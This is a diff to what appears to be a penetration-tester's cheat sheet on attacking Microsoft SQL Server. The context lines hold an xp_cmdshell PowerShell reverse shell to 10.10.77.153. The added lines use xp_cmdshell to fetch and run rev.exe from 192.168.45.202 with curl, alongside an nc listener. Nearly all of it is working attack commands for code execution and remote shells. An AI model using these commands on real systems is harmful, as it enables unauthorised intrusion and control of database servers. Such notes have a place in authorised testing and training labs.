@@ -27,7 +27,12 @@ impacket-mssqlclient user:pass@IP -windows-auth
 
 EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.77.153'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
 ```
-
+Or 
+```
+EXECUTE xp_cmdshell 'curl http://192.168.45.202:8000/rev.exe -o C:\Users\Public\rev.exe';
+EXECUTE xp_cmdshell 'c:\users\public\rev.exe';
+rlwrap nc -nlvp 4444
+```
 ### Sql authentication vs Windows authentication
 >SQL Server Authentication:
 
